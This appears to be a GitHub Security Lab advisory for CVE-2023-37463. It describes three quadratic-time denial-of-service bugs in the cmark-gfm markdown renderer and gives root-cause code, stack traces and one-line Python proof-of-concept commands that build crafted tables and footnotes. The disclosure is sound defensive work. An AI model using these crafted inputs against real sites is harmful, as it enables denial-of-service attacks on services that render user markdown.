@@ -1,0 +1,251 @@
+skip to content
+
+/
+Security Lab
+
+Research Blog
+Advisories
+CodeQL Wall of Fame
+
+Resources
+
+Events
+
+Get Involved
+
+Resources
+
+Open Source Community
+
+Enterprise
+
+/
+Security Lab
+
+Research
+Advisories
+CodeQL Wall of Fame
+
+Resources
+
+Open Source Community
+Enterprise
+
+Events
+Get Involved
+
+July 26, 2023
+
+GHSL-2023-117_GHSL-2023-119: Denial of Service (DoS) in cmark-gfm - CVE-2023-37463
+
+Kevin Backhouse
+
+Coordinated Disclosure Timeline
+
+2023-05-25: GHSA-w4qg-3vf7-m9x5 created.
+
+2023-07-13: CVE-2023-37463 disclosed and 0.29.0.gfm.12 released
+
+Summary
+
+A crafted markdown document can trigger a quadratic complexity algorithm in cmark-gfm.
+
+Product
+
+cmark-gfm
+
+Tested Version
+
+0.29.0.gfm.11
+
+Details
+
+Issue 1: Quadratic loop in table alignment logic (GHSL-2023-117)
+
+A markdown document containing a table with a very large number of columns can trigger quadratic behavior.
+
+Proof of concept:
+
+python3 -c 'n = 20000; print("|" + "x|" * n + "\n|" + "-|" * n)' | cmark-gfm -e table
+
+Increasing the number 20000 in the above command causes the running time to increase quadratically.
+
+This is a sample stack trace from the quadratic algorithm:
+
+0x00007ffff7fb6159 in html_render (extension=0x55555555b2c0, renderer=0x7fffffffcd30, node=0x555555c935b0, ev_type=CMARK_EVENT_ENTER, options=0) at extensions/table.c:758
+
+0x00007ffff7f8dcb8 in S_render_node (renderer=0x7fffffffcd30, node=0x555555c935b0, ev_type=CMARK_EVENT_ENTER, options=0) at src/html.c:143
+
+0x00007ffff7f8f12c in cmark_render_html_with_mem (root=0x55555555bb20, options=0, extensions=0x0, mem=0x7ffff7faf350 <CMARK_DEFAULT_MEM_ALLOCATOR>) at src/html.c:489
+
+0x00005555555566c3 in print_document (document=0x55555555bb20, writer=FORMAT_HTML, options=0, width=0, parser=0x55555555b8e0) at src/main.c:79
+
+0x0000555555557581 in main (argc=4, argv=0x7fffffffdf38) at src/main.c:305
+
+The problem is caused by this loop (table.c:757):
+
+int i = 0;
+for (n = node->parent->first_child; n; n = n->next, ++i)
+if (n == node)
+break;
+
+It’s searching a linked list to calculate the column number of the current table cell, so that it can find the alignment of the cell in the alignments array. This loop is run once for every cell in the row, so if the table has a very large number of columns then the running time is quadratic.
+
+Impact
+
+This issue could be used in a denial-of-service attack on websites that use cmark-gfm to render markdown documents.
+
+Issue 2: Linear-sized input creates quadratic-size table (GHSL-2023-118)
+
+The table syntax allows columns to be omitted from some of the rows. Rows with too few columns are automatically extended to the correct length. For example, each |a| row in this example gets extended to 5 columns:
+
+|x|x|x|x|x|
+|-|-|-|-|-|
+|a|
+|a|
+|a|
+
+Therefore, a header row of width N, followed by M rows of width 1, will expand to an NxM table. Which means that the size of the table can grow quadratically relative to the size of the input file.
+
+Proof of concept:
+
+python3 -c 'n = 2000; print("|" + "x|" * n + "\n|" + "-|" * n + "\n" + "a\n" * n)' | cmark-gfm -e table
+
+Increasing the number 2000 in the above command causes the running time to increase quadratically.
+
+This is a sample stack trace from the quadratic algorithm:
+
+0x00007ffff7fb6159 in html_render (extension=0x55555555b2c0, renderer=0x7fffffffcd30, node=0x555555c935b0, ev_type=CMARK_EVENT_ENTER, options=0) at extensions/table.c:758
+
+0x00007ffff7f8dcb8 in S_render_node (renderer=0x7fffffffcd30, node=0x555555c935b0, ev_type=CMARK_EVENT_ENTER, options=0) at src/html.c:143
+
+0x00007ffff7f8f12c in cmark_render_html_with_mem (root=0x55555555bb20, options=0, extensions=0x0, mem=0x7ffff7faf350 <CMARK_DEFAULT_MEM_ALLOCATOR>) at src/html.c:489
+
+0x00005555555566c3 in print_document (document=0x55555555bb20, writer=FORMAT_HTML, options=0, width=0, parser=0x55555555b8e0) at src/main.c:79
+
+0x0000555555557581 in main (argc=4, argv=0x7fffffffdf38) at src/main.c:305
+
+This stack trace is identical to issue 1. Although the root cause of this bug is different than issue 1, it ends up spending most of its time in the same loop as issue 1.
+
+Impact
+
+This issue could be used in a denial-of-service attack on websites that use cmark-gfm to render markdown documents.
+
+Issue 3: Nested footnotes cause quadratic behavior (GHSL-2023-119)
+
+A markdown document containing a very long list of footnotes followed by a large number of empty lines can trigger quadratic behavior.
+
+Proof of concept:
+
+python3 -c 'n = 10000; print("[^1]:" * n + "\n" * n)' | cmark-gfm -e footnotes
+
+This is a sample stack trace from the quadratic algorithm:
+
+parse_footnote_definition_block_prefix (parser=0x55555555b8e0, input=0x7fffffffcd00, container=0x55555566d610) at src/blocks.c:931
+
+0x00007ffff7f68100 in check_open_blocks (parser=0x55555555b8e0, input=0x7fffffffcd00, all_matched=0x7fffffffcce7) at src/blocks.c:1096
+
+0x00007ffff7f69564 in S_process_line (parser=0x55555555b8e0, buffer=0x7fffffffd50c '\n' <repeats 200 times>..., bytes=0) at src/blocks.c:1491
+
+0x00007ffff7f675df in S_parser_feed (parser=0x55555555b8e0, buffer=0x7fffffffd50c '\n' <repeats 200 times>..., len=4096, eof=false) at src/blocks.c:752
+
+0x00007ffff7f6738a in cmark_parser_feed (parser=0x55555555b8e0, buffer=0x7fffffffce10 '\n' <repeats 200 times>..., len=4096) at src/blocks.c:697
+
+0x000055555555745b in main (argc=4, argv=0x7fffffffdf38) at src/main.c:278
+
+This issue is very similar to GHSL-2023-031 (CVE-2023-24824). The footnotes are parsed as a deeply-nested list of blocks which causes quadratic behavior in the loop in check_open_blocks. The problem is that for each empty line after the footnotes, the loop in check_open_blocks iterates over the entire list.
+
+Impact
+
+This issue could be used in a denial-of-service attack on websites that use cmark-gfm to render markdown documents.
+
+CVE
+
+CVE-2023-37463
+
+Credit
+
+These issues were discovered and reported by GHSL team member @kevinbackhouse (Kevin Backhouse).
+
+Contact
+
+You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2023-117, GHSL-2023-118, or GHSL-2023-119 in any communication regarding these issues.
+
+Product
+
+Features
+
+Security
+
+Team
+
+Enterprise
+
+Customer stories
+
+The ReadME Project
+
+Pricing
+
+Resources
+
+Roadmap
+
+Compare GitHub
+
+Platform
+
+Developer API
+
+Partners
+
+Atom
+
+Electron
+
+GitHub Desktop
+
+Support
+
+Docs
+
+Community Forum
+
+Professional Services
+
+GitHub Skills
+
+Status
+
+Contact GitHub
+
+Company
+
+About
+
+Blog
+
+Careers
+
+Press
+
+Inclusion
+
+Social Impact
+
+Shop
+
+GitHub Inc. ©
+2024
+
+Terms
+
+Privacy
+
+Sitemap
+
+What is Git?
+
+Manage Cookies
+
+Do not share my personal information
